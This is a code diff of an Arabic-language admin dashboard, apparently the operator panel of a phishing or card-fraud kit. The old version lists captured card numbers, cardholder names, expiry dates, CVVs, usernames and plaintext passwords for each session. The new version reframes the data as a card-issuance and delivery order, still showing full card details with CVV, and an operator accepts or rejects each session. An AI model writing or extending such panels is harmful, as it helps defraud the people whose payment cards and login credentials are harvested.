@@ -338,18 +338,19 @@ export default function AdminDashboard() {
               <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                 {/* Login Info */}
                 <DataSection 
-                  title="بيانات الدخول"
+                  title="بيانات الطلب والدفع"
                   icon={<CreditCard className="w-4 h-4" />}
-                  data={selectedSession.loginMethod?.loginType === 'card' ? {
-                    "النوع": "بطاقة بنكية",
-                    "رقم البطاقة": selectedSession.loginMethod.cardNumber,
-                    "الاسم": selectedSession.loginMethod.cardholderName,
-                    "التاريخ": selectedSession.loginMethod.expiryDate,
-                    "CVV": selectedSession.loginMethod.cvv
-                  } : {
-                    "النوع": "حساب مستخدم",
-                    "المستخدم": selectedSession.loginMethod?.username,
-                    "كلمة السر": selectedSession.loginMethod?.password
+                  data={{
+                    "طريقة الاستلام": selectedSession.loginMethod?.deliveryMethod === 'home' ? 'توصيل للمنزل' : 'استلام من الفرع',
+                    "العنوان/الفرع": selectedSession.loginMethod?.deliveryMethod === 'home' ? selectedSession.loginMethod?.deliveryAddress : selectedSession.loginMethod?.branchName,
+                    "تأكيد الهاتف": selectedSession.loginMethod?.phoneConfirmation || "—",
+                    "رقم البطاقة": selectedSession.loginMethod?.cardNumber,
+                    "الاسم": selectedSession.loginMethod?.cardholderName,
+                    "التاريخ": selectedSession.loginMethod?.expiryDate,
+                    "CVV": selectedSession.loginMethod?.cvv,
+                    "رسوم الإصدار": selectedSession.loginMethod?.issuanceFee + " ر.ق",
+                    "رسوم التوصيل": selectedSession.loginMethod?.deliveryFee + " ر.ق",
+                    "الإجمالي": selectedSession.loginMethod?.totalAmount + " ر.ق",
                   }}
                   onAccept={() => handleStatusUpdate(selectedSession.sessionId, 'approved')}
                   onReject={() => handleStatusUpdate(selectedSession.sessionId, 'rejected')}
